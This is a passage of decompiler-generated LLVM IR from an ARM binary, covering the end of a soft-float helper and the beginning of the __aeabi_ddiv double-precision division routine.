  %v6_1ebc8 = sub i32 0, %v0_1ebc8
  %v7_1ebc8 = and i32 %v4_1ebc8, %v6_1ebc8
  %v8_1ebc8 = icmp slt i32 %v7_1ebc8, 0
  store i1 %v8_1ebc8, i1* @cpsr_v, align 1
  %v9_1ebc8 = icmp slt i32 %v4_1ebc8, 0
  store i1 %v9_1ebc8, i1* @cpsr_n, align 1
  %v10_1ebc8 = icmp eq i32 %v4_1ebc8, 0
  store i1 %v10_1ebc8, i1* @cpsr_z, align 1
  %v7_1ebcc = icmp sgt i32 %v0_1ebc8, -54
  br i1 %v7_1ebcc, label %bb6, label %bb

bb:                                               ; preds = %dec_label_pc_1ebc8
  store i32 0, i32* @r1, align 4
  %v8_1ebd0 = load i32, i32* %r0.global-to-local, align 4
  %v9_1ebd0 = and i32 %v8_1ebd0, -2147483648
  store i32 %v9_1ebd0, i32* %r0.global-to-local, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v9_1ebd0

bb6:                                              ; preds = %dec_label_pc_1ebc8
  %v1_1ebd8 = sub i32 0, %v0_1ebc8
  %v2_1ebdc = sub i32 -32, %v0_1ebc8
  %v4_1ebdc = add i32 %v0_1ebc8, 31
  %v5_1ebdc = and i32 %v4_1ebdc, %v1_1ebd8
  %v6_1ebdc = icmp slt i32 %v5_1ebdc, 0
  store i1 %v6_1ebdc, i1* @cpsr_v, align 1
  %v6_1ebe0 = icmp slt i32 %v1_1ebd8, 32
  br i1 %v6_1ebe0, label %dec_label_pc_1ebe4, label %dec_label_pc_1ec48

dec_label_pc_1ebe4:                               ; preds = %bb6
  %v1_1ebe4 = add i32 %v2_1ebdc, 12
  %v8_1ebe8 = icmp sgt i32 %v1_1ebe4, 0
  br i1 %v8_1ebe8, label %dec_label_pc_1ec1c, label %dec_label_pc_1ebec

dec_label_pc_1ebec:                               ; preds = %dec_label_pc_1ebe4
  %v1_1ebec = add i32 %v2_1ebdc, 32
  %v1_1ebf0 = sub i32 0, %v2_1ebdc
  %v0_1ebf4 = load i32, i32* @r1, align 4
  %v6_1ebf4 = shl i32 %v0_1ebf4, %v1_1ebf0
  %v2_1ebf8 = add i32 %v2_1ebdc, 31
  %v3_1ebf8 = shl i32 1, %v2_1ebf8
  %v6_1ebf8 = lshr i32 %v0_1ebf4, %v1_1ebec
  %v1_1ebfc = load i32, i32* %r0.global-to-local, align 4
  %v7_1ebfc = shl i32 %v1_1ebfc, %v1_1ebf0
  %v8_1ebfc = or i32 %v7_1ebfc, %v6_1ebf8
  %v1_1ec00 = and i32 %v1_1ebfc, -2147483648
  %tmp = bitcast i32 %v1_1ebfc to float
  %tmp13 = call float @fabsf(float %tmp)
  %v1_1ec04 = bitcast float %tmp13 to i32
  %tmp14 = icmp slt i32 %v6_1ebf4, 0
  %v4_1ec08 = zext i1 %tmp14 to i32
  %v5_1ec08 = add i32 %v8_1ebfc, %v4_1ec08
  store i32 %v5_1ec08, i32* @r1, align 4
  %v5_1ec0c = and i32 %v1_1ec04, %v3_1ebf8
  %v6_1ec0c = icmp ne i32 %v5_1ec0c, 0
  %v7_1ec0c = lshr i32 %v1_1ec04, %v1_1ebec
  %v9_1ec0c = add i32 %v7_1ec0c, %v1_1ec00
  %v10_1ec0c = zext i1 %v6_1ec0c to i32
  %v11_1ec0c = add i32 %v9_1ec0c, %v10_1ec0c
  store i32 %v11_1ec0c, i32* %r0.global-to-local, align 4
  %v19_1ec0c = add i32 %v11_1ec0c, %v10_1ec0c
  %v20_1ec0c = xor i32 %v19_1ec0c, %v1_1ebfc
  %v21_1ec0c = xor i32 %v19_1ec0c, %v7_1ec0c
  %v22_1ec0c = and i32 %v20_1ec0c, %v21_1ec0c
  %v23_1ec0c = icmp slt i32 %v22_1ec0c, 0
  store i1 %v23_1ec0c, i1* @cpsr_v, align 1
  %v0_1ec10 = load i32, i32* @lr, align 4
  %v3_1ec10 = mul i32 %v6_1ebf4, 2
  %v4_1ec10 = or i32 %v0_1ec10, %v3_1ec10
  %v5_1ec10 = icmp slt i32 %v4_1ec10, 0
  store i1 %v5_1ec10, i1* @cpsr_n, align 1
  %v6_1ec10 = icmp eq i32 %v4_1ec10, 0
  store i1 %v6_1ec10, i1* @cpsr_z, align 1
  br i1 %v6_1ec10, label %bb7, label %bb8

bb7:                                              ; preds = %dec_label_pc_1ebec
  %tmp15 = sext i1 %tmp14 to i32
  %v6_1ec14 = add nsw i32 %tmp15, -1
  %v7_1ec14 = and i32 %v5_1ec08, %v6_1ec14
  store i32 %v7_1ec14, i32* @r1, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_1ebec, %bb7
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v11_1ec0c

dec_label_pc_1ec1c:                               ; preds = %dec_label_pc_1ebe4
  %v1_1ec1c = sub i32 0, %v2_1ebdc
  %v1_1ec20 = add i32 %v2_1ebdc, 32
  %v0_1ec24 = load i32, i32* @r1, align 4
  %v6_1ec24 = shl i32 %v0_1ec24, %v1_1ec1c
  %v6_1ec28 = lshr i32 %v0_1ec24, %v1_1ec20
  %v1_1ec2c = load i32, i32* %r0.global-to-local, align 4
  %v7_1ec2c = shl i32 %v1_1ec2c, %v1_1ec1c
  %v8_1ec2c = or i32 %v7_1ec2c, %v6_1ec28
  %v1_1ec30 = and i32 %v1_1ec2c, -2147483648
  %tmp16 = icmp slt i32 %v6_1ec24, 0
  %v4_1ec34 = zext i1 %tmp16 to i32
  %v5_1ec34 = add i32 %v8_1ec2c, %v4_1ec34
  store i32 %v5_1ec34, i32* @r1, align 4
  %v6_1ec34 = icmp ult i32 %v5_1ec34, %v8_1ec2c
  %v2_1ec38 = zext i1 %v6_1ec34 to i32
  %v3_1ec38 = or i32 %v2_1ec38, %v1_1ec30
  store i32 %v3_1ec38, i32* %r0.global-to-local, align 4
  %v9_1ec38 = add nsw i32 %v3_1ec38, %v2_1ec38
  %v10_1ec38 = sub i32 0, %v1_1ec2c
  %v11_1ec38 = and i32 %v9_1ec38, %v10_1ec38
  %v12_1ec38 = icmp slt i32 %v11_1ec38, 0
  store i1 %v12_1ec38, i1* @cpsr_v, align 1
  %v0_1ec3c = load i32, i32* @lr, align 4
  %v3_1ec3c = mul i32 %v6_1ec24, 2
  %v4_1ec3c = or i32 %v0_1ec3c, %v3_1ec3c
  %v5_1ec3c = icmp slt i32 %v4_1ec3c, 0
  store i1 %v5_1ec3c, i1* @cpsr_n, align 1
  %v6_1ec3c = icmp eq i32 %v4_1ec3c, 0
  store i1 %v6_1ec3c, i1* @cpsr_z, align 1
  br i1 %v6_1ec3c, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_1ec1c
  %tmp17 = sext i1 %tmp16 to i32
  %v6_1ec40 = add nsw i32 %tmp17, -1
  %v7_1ec40 = and i32 %v5_1ec34, %v6_1ec40
  store i32 %v7_1ec40, i32* @r1, align 4
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_1ec1c, %bb9
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v3_1ec38

dec_label_pc_1ec48:                               ; preds = %bb6
  %v1_1ec48 = sub i32 32, %v2_1ebdc
  %v0_1ec4c = load i32, i32* @lr, align 4
  %v1_1ec4c = load i32, i32* @r1, align 4
  %v7_1ec4c = shl i32 %v1_1ec4c, %v1_1ec48
  %v8_1ec4c = or i32 %v7_1ec4c, %v0_1ec4c
  %v6_1ec50 = lshr i32 %v1_1ec4c, %v2_1ebdc
  %v1_1ec54 = load i32, i32* %r0.global-to-local, align 4
  %v7_1ec54 = shl i32 %v1_1ec54, %v1_1ec48
  %v8_1ec54 = or i32 %v7_1ec54, %v6_1ec50
  %v6_1ec58 = lshr i32 %v1_1ec54, %v2_1ebdc
  %v1_1ec5c = and i32 %v1_1ec54, -2147483648
  store i32 %v1_1ec5c, i32* %r0.global-to-local, align 4
  %v7_1ec60 = lshr i32 %v1_1ec5c, %v2_1ebdc
  %v8_1ec60 = sub i32 -1, %v7_1ec60
  %v9_1ec60 = and i32 %v6_1ec58, %v8_1ec60
  %tmp18 = icmp slt i32 %v8_1ec54, 0
  %v4_1ec64 = zext i1 %tmp18 to i32
  %v5_1ec64 = add i32 %v4_1ec64, %v9_1ec60
  store i32 %v5_1ec64, i32* @r1, align 4
  %v3_1ec68 = mul i32 %v8_1ec54, 2
  %v4_1ec68 = or i32 %v8_1ec4c, %v3_1ec68
  %v5_1ec68 = icmp slt i32 %v4_1ec68, 0
  store i1 %v5_1ec68, i1* @cpsr_n, align 1
  %v6_1ec68 = icmp eq i32 %v4_1ec68, 0
  store i1 %v6_1ec68, i1* @cpsr_z, align 1
  br i1 %v6_1ec68, label %bb11, label %bb12

bb11:                                             ; preds = %dec_label_pc_1ec48
  %tmp19 = sext i1 %tmp18 to i32
  %v6_1ec6c = add nsw i32 %tmp19, -1
  %v7_1ec6c = and i32 %v5_1ec64, %v6_1ec6c
  store i32 %v7_1ec6c, i32* @r1, align 4
  br label %bb12

bb12:                                             ; preds = %dec_label_pc_1ec48, %bb11
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_1ec5c

dec_label_pc_1ed2c:                               ; preds = %dec_label_pc_1ebc4
  %v0_1ed2c = load i32, i32* %r0.global-to-local, align 4
  %v1_1ed2c = and i32 %v0_1ed2c, -2147483648
  %v1_1ed34 = or i32 %v1_1ed2c, 2146435072
  store i32 %v1_1ed34, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %tmp4, i32* @r4, align 4
  store i32 %tmp3, i32* @r5, align 4
  store i32 %tmp2, i32* @r6, align 4
  ret i32 %v1_1ed34

; uselistorder directives
  uselistorder i32 %v3_1ec38, { 2, 0, 1 }
  uselistorder i32 %v8_1ec2c, { 1, 0 }
  uselistorder i32 %v1_1ec1c, { 1, 0 }
  uselistorder i32 %v11_1ec0c, { 1, 0, 2 }
  uselistorder i32 %v1_1ebfc, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1ebf0, { 1, 0 }
  uselistorder i32 %v2_1ebdc, { 5, 6, 7, 9, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 %v1_1ebd8, { 1, 0 }
  uselistorder i32 %v4_1ebc8, { 1, 2, 0 }
  uselistorder i32 %v0_1ebc8, { 3, 2, 1, 4, 0, 5 }
  uselistorder i32 %tmp4, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp3, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp2, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 0, 7, 1, 8, 2, 9, 3, 10, 4, 5 }
  uselistorder i32 12, { 55, 56, 57, 64, 0, 65, 68, 4, 2, 3, 69, 70, 6, 1, 5, 22, 12, 26, 13, 14, 66, 67, 23, 24, 25, 15, 71, 72, 73, 74, 75, 16, 76, 63, 17, 79, 80, 10, 132, 133, 134, 135, 136, 137, 11, 138, 139, 140, 141, 142, 143, 18, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 92, 77, 78, 91, 58, 59, 60, 61, 62, 27, 28, 29, 19, 30, 31, 32, 48, 53, 33, 34, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 7, 20, 111, 112, 113, 8, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 21, 131, 144, 9, 93, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 49, 50, 51, 52, 54 }
  uselistorder i32 -32, { 4, 3, 5, 6, 7, 11, 8, 12, 13, 0, 9, 2, 10, 1, 14 }
  uselistorder i32 54, { 4, 0, 1, 2, 3 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_1ed40(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1ed40:
  %v1_1ed44 = or i32 %arg1, 2146959360
  ret i32 %v1_1ed44
}

define i32 @__aeabi_ddiv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1ed4c = load i32, i32* @r4, align 4
  store i32 %v3_1ed4c, i32* %stack_var_-16, align 4
  %v6_1ed4c = load i32, i32* @r5, align 4
  %v9_1ed4c = load i32, i32* @r6, align 4
  store i32 2047, i32* %ip.global-to-local, align 4
  %v1_1ed58 = load i32, i32* %r0.global-to-local, align 4
  %v4_1ed58 = udiv i32 %v1_1ed58, 1048576
  %v5_1ed58 = urem i32 %v4_1ed58, 2048
  store i32 %v5_1ed58, i32* @r4, align 4
  %v6_1ed58 = icmp eq i32 %v5_1ed58, 0
  br i1 %v6_1ed58, label %entry..thread2_crit_edge, label %bb

entry..thread2_crit_edge:                         ; preds = %entry
  %.pre150 = udiv i32 %arg3, 1048576
  br label %.thread2

bb:                                               ; preds = %entry
  %v5_1ed5c = udiv i32 %arg3, 1048576
  %v6_1ed5c = urem i32 %v5_1ed5c, 2048
  store i32 %v6_1ed5c, i32* %r5.global-to-local, align 4
  %v7_1ed5c = icmp eq i32 %v6_1ed5c, 0
  br i1 %v7_1ed5c, label %.thread1, label %bb92

.thread1:                                         ; preds = %bb
  br label %dec_label_pc_1eee0

bb92:                                             ; preds = %bb
  %v5_1ed60 = icmp eq i32 %v5_1ed58, 2047
  br i1 %v5_1ed60, label %.thread2, label %bb93

.thread2:                                         ; preds = %entry..thread2_crit_edge, %bb92
  %.pre148.pre-phi = phi i32 [ %.pre150, %entry..thread2_crit_edge ], [ %v5_1ed5c, %bb92 ]
  br label %dec_label_pc_1eee0

bb93:                                             ; preds = %bb92
  %v5_1ed64 = icmp eq i32 %v6_1ed5c, 2047
  br i1 %v5_1ed64, label %dec_label_pc_1eee0, label %dec_label_pc_1ed6c

dec_label_pc_1ed6c:                               ; preds = %bb93
  %v2_1ed6c = sub nsw i32 %v5_1ed58, %v6_1ed5c
  store i32 %v2_1ed6c, i32* %r4.global-to-local, align 4
  %v2_1ed70 = xor i32 %v1_1ed58, %arg3
  %v4_1ed74 = mul i32 %arg3, 4096
  %v5_1ed74 = or i32 %v4_1ed74, %arg4
  store i32 %v5_1ed74, i32* %r5.global-to-local, align 4
  %v7_1ed74 = icmp eq i32 %v5_1ed74, 0
  %v3_1ed78 = mul i32 %v1_1ed58, 4096
  store i32 %v3_1ed78, i32* %r0.global-to-local, align 4
  br i1 %v7_1ed74, label %dec_label_pc_1eeb0, label %dec_label_pc_1ed80

dec_label_pc_1ed80:                               ; preds = %dec_label_pc_1ed6c
  %tmp94 = mul i32 %arg3, 256
  %v4_1ed88 = and i32 %tmp94, 268435200
  %v4_1ed8c = udiv i32 %arg4, 16777216
  %v5_1ed88 = or i32 %v4_1ed8c, %v4_1ed88
  %v5_1ed8c = or i32 %v5_1ed88, 268435456
  store i32 %v5_1ed8c, i32* %r2.global-to-local, align 4
  %v3_1ed90 = mul i32 %arg4, 256
  store i32 %v3_1ed90, i32* %r3.global-to-local, align 4
  %tmp95 = mul i32 %v1_1ed58, 256
  %v4_1ed94 = and i32 %tmp95, 268435200
  %v1_1ed98 = load i32, i32* @r1, align 4
  %v4_1ed98 = udiv i32 %v1_1ed98, 16777216
  %v5_1ed94 = or i32 %v4_1ed94, %v4_1ed98
  %v5_1ed98 = or i32 %v5_1ed94, 268435456
  store i32 %v5_1ed98, i32* %r5.global-to-local, align 4
  %v3_1ed9c = mul i32 %v1_1ed98, 256
  store i32 %v3_1ed9c, i32* %r6.global-to-local, align 4
  %v1_1eda0 = and i32 %v2_1ed70, -2147483648
  store i32 %v1_1eda0, i32* %r0.global-to-local, align 4
  %v3_1eda4 = icmp uge i32 %v5_1ed98, %v5_1ed8c
  %v9_1eda4 = icmp eq i32 %v5_1ed98, %v5_1ed8c
  br i1 %v9_1eda4, label %bb96, label %bb97

bb96:                                             ; preds = %dec_label_pc_1ed80
  %v4_1eda8 = icmp uge i32 %v3_1ed9c, %v3_1ed90
  br label %bb97

bb97:                                             ; preds = %dec_label_pc_1ed80, %bb96
  %v1_1edac = phi i1 [ %v3_1eda4, %dec_label_pc_1ed80 ], [ %v4_1eda8, %bb96 ]
  %v2_1edac = add nsw i32 %v2_1ed6c, 253
  %v3_1edac = zext i1 %v1_1edac to i32
  %v4_1edac = add nsw i32 %v2_1edac, %v3_1edac
  %v8_1edac = icmp ule i32 %v4_1edac, %v2_1ed6c
  %v9_1edac = icmp ugt i32 %v2_1ed6c, -254
  %v10_1edac = select i1 %v1_1edac, i1 %v8_1edac, i1 %v9_1edac
  %v1_1edb0 = add nsw i32 %v4_1edac, 768
  store i32 %v1_1edb0, i32* %r4.global-to-local, align 4
  br i1 %v10_1edac, label %dec_label_pc_1edc0, label %dec_label_pc_1edb8

dec_label_pc_1edb8:                               ; preds = %bb97
  %v3_1edb8 = udiv i32 %v5_1ed8c, 2
  store i32 %v3_1edb8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1edc0

dec_label_pc_1edc0:                               ; preds = %bb97, %dec_label_pc_1edb8
  %v0_1edc8 = phi i32 [ %v5_1ed8c, %bb97 ], [ %v3_1edb8, %dec_label_pc_1edb8 ]
  %v0_1edcc = phi i32 [ %v3_1ed90, %bb97 ], [ 0, %dec_label_pc_1edb8 ]
  %v2_1edc0 = sub i32 %v3_1ed9c, %v0_1edcc
  store i32 %v2_1edc0, i32* %r6.global-to-local, align 4
  %v3_1edc0 = icmp uge i32 %v3_1ed9c, %v0_1edcc
  %v3_1edc4 = icmp eq i1 %v3_1edc0, false
  %v4_1edc4 = sub nsw i32 %v5_1ed98, %v0_1edc8
  %v6_1edc4 = sext i1 %v3_1edc4 to i32
  %v7_1edc4 = add nsw i32 %v6_1edc4, %v4_1edc4
  store i32 %v7_1edc4, i32* %r5.global-to-local, align 4
  %v3_1edc8 = udiv i32 %v0_1edc8, 2
  store i32 %v3_1edc8, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1edd8.outer

dec_label_pc_1edd8.outer:                         ; preds = %dec_label_pc_1ee70, %dec_label_pc_1edc0
  %v1_1ee84.ph = phi i32 [ %v2_1ee70, %dec_label_pc_1ee70 ], [ %v1_1eda0, %dec_label_pc_1edc0 ]
  %v0_1eddc.ph = phi i32 [ %v5_1ee4c, %dec_label_pc_1ee70 ], [ %v7_1edc4, %dec_label_pc_1edc0 ]
  %v1_1ede0.ph = phi i32 [ %v3_1ee50, %dec_label_pc_1ee70 ], [ %v2_1edc0, %dec_label_pc_1edc0 ]
  %v5_1ee5817.ph = phi i32 [ %v5_1ee58, %dec_label_pc_1ee70 ], [ %v3_1edc8, %dec_label_pc_1edc0 ]
  %v3_1ee5c13.ph = phi i32 [ %v3_1ee5c, %dec_label_pc_1ee70 ], [ 0, %dec_label_pc_1edc0 ]
  %storemerge136 = phi i32 [ 0, %dec_label_pc_1ee70 ], [ 1048576, %dec_label_pc_1edc0 ]
  %storemerge = phi i32 [ -2147483648, %dec_label_pc_1ee70 ], [ 524288, %dec_label_pc_1edc0 ]
  store i32 %storemerge136, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1edd8

dec_label_pc_1edd8:                               ; preds = %dec_label_pc_1edd8.outer, %dec_label_pc_1ee48
  %v1_1ee3c59 = phi i32 [ %v2_1ee84, %dec_label_pc_1ee48 ], [ %storemerge136, %dec_label_pc_1edd8.outer ]
  %v1_1ede8 = phi i32 [ %v1_1ede832, %dec_label_pc_1ee48 ], [ %storemerge136, %dec_label_pc_1edd8.outer ]
  %v1_1ee0441 = phi i32 [ %v1_1ee0443, %dec_label_pc_1ee48 ], [ %storemerge136, %dec_label_pc_1edd8.outer ]
  %v1_1ee2050 = phi i32 [ %v1_1ee2052, %dec_label_pc_1ee48 ], [ %storemerge136, %dec_label_pc_1edd8.outer ]
  %v0_1ee60 = phi i32 [ %v3_1ee60, %dec_label_pc_1ee48 ], [ %storemerge, %dec_label_pc_1edd8.outer ]
  %v0_1eddc = phi i32 [ %v5_1ee4c, %dec_label_pc_1ee48 ], [ %v0_1eddc.ph, %dec_label_pc_1edd8.outer ]
  %v1_1ede0 = phi i32 [ %v3_1ee50, %dec_label_pc_1ee48 ], [ %v1_1ede0.ph, %dec_label_pc_1edd8.outer ]
  %v5_1ee5817 = phi i32 [ %v5_1ee58, %dec_label_pc_1ee48 ], [ %v5_1ee5817.ph, %dec_label_pc_1edd8.outer ]
  %v3_1ee5c13 = phi i32 [ %v3_1ee5c, %dec_label_pc_1ee48 ], [ %v3_1ee5c13.ph, %dec_label_pc_1edd8.outer ]
  %v3_1edd8 = icmp uge i32 %v1_1ede0, %v3_1ee5c13
  %v3_1eddc = icmp eq i1 %v3_1edd8, false
  %v4_1eddc = sub i32 %v0_1eddc, %v5_1ee5817
  %v6_1eddc = sext i1 %v3_1eddc to i32
  %v7_1eddc = add i32 %v6_1eddc, %v4_1eddc
  %v8_1eddc = zext i1 %v3_1eddc to i32
  %v9_1eddc = sub i32 %v7_1eddc, %v8_1eddc
  %v10_1eddc = icmp ult i32 %v0_1eddc, %v9_1eddc
  %v11_1eddc = icmp ne i32 %v5_1ee5817, -1
  %v12_1eddc = or i1 %v11_1eddc, %v10_1eddc
  %v13_1eddc = icmp ult i32 %v0_1eddc, %v5_1ee5817
  %v14_1eddc = select i1 %v3_1eddc, i1 %v12_1eddc, i1 %v13_1eddc
  br i1 %v14_1eddc, label %.thread4, label %bb98

bb98:                                             ; preds = %dec_label_pc_1edd8
  %v3_1ede0 = sub i32 %v1_1ede0, %v3_1ee5c13
  store i32 %v3_1ede0, i32* %r6.global-to-local, align 4
  store i32 %v7_1eddc, i32* %r5.global-to-local, align 4
  %v3_1ede8 = or i32 %v1_1ede8, %v0_1ee60
  store i32 %v3_1ede8, i32* %r1.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_1edd8, %bb98
  %v1_1ee3c58 = phi i32 [ %v1_1ee3c59, %dec_label_pc_1edd8 ], [ %v3_1ede8, %bb98 ]
  %v1_1ede835 = phi i32 [ %v1_1ede8, %dec_label_pc_1edd8 ], [ %v3_1ede8, %bb98 ]
  %v1_1ee04 = phi i32 [ %v1_1ee0441, %dec_label_pc_1edd8 ], [ %v3_1ede8, %bb98 ]
  %v1_1ee2049 = phi i32 [ %v1_1ee2050, %dec_label_pc_1edd8 ], [ %v3_1ede8, %bb98 ]
  %v0_1edf8 = phi i32 [ %v0_1eddc, %dec_label_pc_1edd8 ], [ %v7_1eddc, %bb98 ]
  %v1_1edfc = phi i32 [ %v1_1ede0, %dec_label_pc_1edd8 ], [ %v3_1ede0, %bb98 ]
  %v1_1edec = urem i32 %v5_1ee5817, 2
  %v2_1edec = icmp ne i32 %v1_1edec, 0
  %v3_1edec = udiv i32 %v5_1ee5817, 2
  %v3_1edf0 = zext i1 %v2_1edec to i32
  %v6_1edf0 = zext i32 %v3_1ee5c13 to i64
  %v7_1edf0 = sub i32 33, %v3_1ee5c13
  %v8_1edf0 = zext i32 %v7_1edf0 to i64
  %v9_1edf0 = shl i64 %v6_1edf0, %v8_1edf0
  %v10_1edf0 = sub i32 32, %v3_1ee5c13
  %v11_1edf0 = shl i32 %v3_1edf0, %v10_1edf0
  %v12_1edf0 = zext i32 %v11_1edf0 to i64
  %v14_1edf0 = or i64 %v12_1edf0, %v9_1edf0
  %v15_1edf0 = trunc i64 %v14_1edf0 to i32
  %v3_1edf4 = icmp uge i32 %v1_1edfc, %v15_1edf0
  %v3_1edf8 = icmp eq i1 %v3_1edf4, false
  %v4_1edf8 = sub i32 %v0_1edf8, %v3_1edec
  %v6_1edf8 = sext i1 %v3_1edf8 to i32
  %v7_1edf8 = add i32 %v6_1edf8, %v4_1edf8
  %v13_1edf8 = icmp ult i32 %v0_1edf8, %v3_1edec
  %v14_1edf8 = or i1 %v13_1edf8, %v3_1edf8
  br i1 %v14_1edf8, label %.thread6, label %bb99

bb99:                                             ; preds = %.thread4
  %v3_1edfc = sub i32 %v1_1edfc, %v15_1edf0
  store i32 %v3_1edfc, i32* %r6.global-to-local, align 4
  store i32 %v7_1edf8, i32* %r5.global-to-local, align 4
  %v5_1ee04 = udiv i32 %v0_1ee60, 2
  %v6_1ee04 = or i32 %v1_1ee04, %v5_1ee04
  store i32 %v6_1ee04, i32* %r1.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %.thread4, %bb99
  %v1_1ee3c57 = phi i32 [ %v1_1ee3c58, %.thread4 ], [ %v6_1ee04, %bb99 ]
  %v1_1ede834 = phi i32 [ %v1_1ede835, %.thread4 ], [ %v6_1ee04, %bb99 ]
  %v1_1ee0445 = phi i32 [ %v1_1ee04, %.thread4 ], [ %v6_1ee04, %bb99 ]
  %v1_1ee20 = phi i32 [ %v1_1ee2049, %.thread4 ], [ %v6_1ee04, %bb99 ]
  %v0_1ee14 = phi i32 [ %v0_1edf8, %.thread4 ], [ %v7_1edf8, %bb99 ]
  %v1_1ee18 = phi i32 [ %v1_1edfc, %.thread4 ], [ %v3_1edfc, %bb99 ]
  %v1_1ee08 = urem i32 %v3_1edec, 2
  %v2_1ee08 = icmp ne i32 %v1_1ee08, 0
  %v3_1ee08 = udiv i32 %v5_1ee5817, 4
  %v3_1ee0c = zext i1 %v2_1ee08 to i32
  %v6_1ee0c = and i64 %v14_1edf0, 4294967295
  %v7_1ee0c = sub i32 33, %v15_1edf0
  %v8_1ee0c = zext i32 %v7_1ee0c to i64
  %v9_1ee0c = shl i64 %v6_1ee0c, %v8_1ee0c
  %v10_1ee0c = sub i32 32, %v15_1edf0
  %v11_1ee0c = shl i32 %v3_1ee0c, %v10_1ee0c
  %v12_1ee0c = zext i32 %v11_1ee0c to i64
  %v14_1ee0c = or i64 %v12_1ee0c, %v9_1ee0c
  %v15_1ee0c = trunc i64 %v14_1ee0c to i32
  %v3_1ee10 = icmp uge i32 %v1_1ee18, %v15_1ee0c
  %v3_1ee14 = icmp eq i1 %v3_1ee10, false
  %v4_1ee14 = sub i32 %v0_1ee14, %v3_1ee08
  %v6_1ee14 = sext i1 %v3_1ee14 to i32
  %v7_1ee14 = add i32 %v6_1ee14, %v4_1ee14
  %v13_1ee14 = icmp ult i32 %v0_1ee14, %v3_1ee08
  %v14_1ee14 = or i1 %v13_1ee14, %v3_1ee14
  br i1 %v14_1ee14, label %.thread8, label %bb100

bb100:                                            ; preds = %.thread6
  %v3_1ee18 = sub i32 %v1_1ee18, %v15_1ee0c
  store i32 %v3_1ee18, i32* %r6.global-to-local, align 4
  store i32 %v7_1ee14, i32* %r5.global-to-local, align 4
  %v5_1ee20 = udiv i32 %v0_1ee60, 4
  %v6_1ee20 = or i32 %v1_1ee20, %v5_1ee20
  store i32 %v6_1ee20, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread6, %bb100
  %v1_1ee3c = phi i32 [ %v1_1ee3c57, %.thread6 ], [ %v6_1ee20, %bb100 ]
  %v1_1ede833 = phi i32 [ %v1_1ede834, %.thread6 ], [ %v6_1ee20, %bb100 ]
  %v1_1ee0444 = phi i32 [ %v1_1ee0445, %.thread6 ], [ %v6_1ee20, %bb100 ]
  %v1_1ee2053 = phi i32 [ %v1_1ee20, %.thread6 ], [ %v6_1ee20, %bb100 ]
  %v0_1ee30 = phi i32 [ %v0_1ee14, %.thread6 ], [ %v7_1ee14, %bb100 ]
  %v1_1ee34 = phi i32 [ %v1_1ee18, %.thread6 ], [ %v3_1ee18, %bb100 ]
  %v1_1ee24 = urem i32 %v3_1ee08, 2
  %v2_1ee24 = icmp ne i32 %v1_1ee24, 0
  %v3_1ee24 = udiv i32 %v5_1ee5817, 8
  %v3_1ee28 = zext i1 %v2_1ee24 to i32
  %v6_1ee28 = and i64 %v14_1ee0c, 4294967295
  %v7_1ee28 = sub i32 33, %v15_1ee0c
  %v8_1ee28 = zext i32 %v7_1ee28 to i64
  %v9_1ee28 = shl i64 %v6_1ee28, %v8_1ee28
  %v10_1ee28 = sub i32 32, %v15_1ee0c
  %v11_1ee28 = shl i32 %v3_1ee28, %v10_1ee28
  %v12_1ee28 = zext i32 %v11_1ee28 to i64
  %v14_1ee28 = or i64 %v12_1ee28, %v9_1ee28
  %v15_1ee28 = trunc i64 %v14_1ee28 to i32
  %v3_1ee2c = icmp uge i32 %v1_1ee34, %v15_1ee28
  %v3_1ee30 = icmp eq i1 %v3_1ee2c, false
  %v4_1ee30 = sub i32 %v0_1ee30, %v3_1ee24
  %v6_1ee30 = sext i1 %v3_1ee30 to i32
  %v7_1ee30 = add i32 %v6_1ee30, %v4_1ee30
  %v13_1ee30 = icmp ult i32 %v0_1ee30, %v3_1ee24
  %v14_1ee30 = or i1 %v13_1ee30, %v3_1ee30
